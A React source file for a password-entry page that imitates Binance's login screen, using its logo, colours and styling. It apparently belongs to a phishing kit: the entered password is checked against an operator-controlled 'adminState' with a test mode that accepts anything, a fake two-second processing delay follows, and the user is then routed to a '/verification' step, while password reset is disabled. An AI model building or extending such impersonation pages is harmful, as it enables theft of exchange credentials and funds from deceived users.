import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useApp } from '@/store/AppContext';
import { LoadingBars } from '@/components/ui/custom/LoadingBars';
import { Eye, EyeOff } from 'lucide-react';

export default function Password() {
  const navigate = useNavigate();
  const { adminState, showToast } = useApp();
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [loginIdentifier, setLoginIdentifier] = useState('');

  useEffect(() => {
    const identifier = sessionStorage.getItem('loginIdentifier');
    if (!identifier) {
      navigate('/');
      return;
    }
    setLoginIdentifier(identifier);
  }, [navigate]);

  function maskEmail(email: string): string {
    if (!email) return '';
    if (email.includes('@')) {
      const [local, domain] = email.split('@');
      if (local.length <= 2) return email;
      const maskedLocal = local.charAt(0) + '***' + local.charAt(local.length - 1);
      return `${maskedLocal}@${domain}`;
    }
    if (email.length <= 6) return email;
    return email.slice(0, 2) + '***' + email.slice(-2);
  }

  async function handleLogin() {
    if (!password) {
      showToast('Please enter your password', 'error');
      return;
    }

    setIsLoading(true);

    // Simulate processing
    await new Promise(resolve => setTimeout(resolve, 2000));

    // Check password (use test mode or actual password)
    if (!adminState.auth.testMode && password !== adminState.auth.password) {
      setIsLoading(false);
      showToast('Invalid password', 'error');
      return;
    }

    setIsLoading(false);
    navigate('/verification');
  }

  function handleKeyPress(e: React.KeyboardEvent) {
    if (e.key === 'Enter') {
      handleLogin();
    }
  }

  function handleForgotPassword() {
    showToast('Password reset is currently unavailable', 'info');
  }

  function handleDifferentAccount() {
    sessionStorage.removeItem('loginIdentifier');
    navigate('/');
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#1D252B]">
      <div className="flex-1 flex flex-col px-6 pt-5 pb-1 max-w-[400px] mx-auto w-full">
        {/* Logo */}
        <div className="flex items-center gap-2 mb-10 self-start">
          <img src="/source/logo.png" alt="Binance" className="h-8 w-auto" />
        </div>

        <h1 className="text-[32px] font-semibold mb-3 text-white tracking-tight">Enter Password</h1>
        
        <div className="text-base text-[#848E9C] mb-8">{maskEmail(loginIdentifier)}</div>

        <label className="block text-sm text-[#848E9C] mb-2">Password</label>
        
        <div className="relative mb-4">
          <input
            type={showPassword ? 'text' : 'password'}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            onKeyPress={handleKeyPress}
            placeholder="Enter your password"
            className="binance-input px-4 py-4 pr-12 border-[#F0B90B]"
          />
          <button
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-4 top-1/2 -translate-y-1/2 text-[#848E9C] hover:text-white transition-colors"
          >
            {showPassword ? (
              <EyeOff className="w-5 h-5" />
            ) : (
              <Eye className="w-5 h-5" />
            )}
          </button>
        </div>

        <button
          onClick={handleLogin}
          disabled={isLoading}
          className="binance-btn mt-2 h-12 md:h-11 lg:h-11 text-base rounded-xl"
        >
          {isLoading ? (
            <LoadingBars color="#1E2329" size="sm" />
          ) : (
            'Log In'
          )}
        </button>

        <div className="mt-12 flex flex-col gap-6">
          <button onClick={handleForgotPassword} className="footer-link text-left">
            Forgot password?
          </button>
          <button onClick={handleDifferentAccount} className="footer-link text-left">
            Use a different account
          </button>
        </div>
      </div>

      {/* Footer */}
      <div className="py-6 px-4 flex justify-center items-center gap-8 text-sm text-[#848E9C]">
        <button className="flex items-center gap-2 hover:text-[#EAECEF] transition-colors">
          <svg viewBox="0 0 24 24" className="w-4 h-4" fill="none" stroke="currentColor" strokeWidth="2">
            <circle cx="12" cy="12" r="10"/>
            <path d="M2 12h20M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
          </svg>
          English
        </button>
        <button className="hover:text-[#EAECEF] transition-colors">Cookies</button>
        <button className="hover:text-[#EAECEF] transition-colors">Privacy</button>
      </div>
    </div>
  );
}
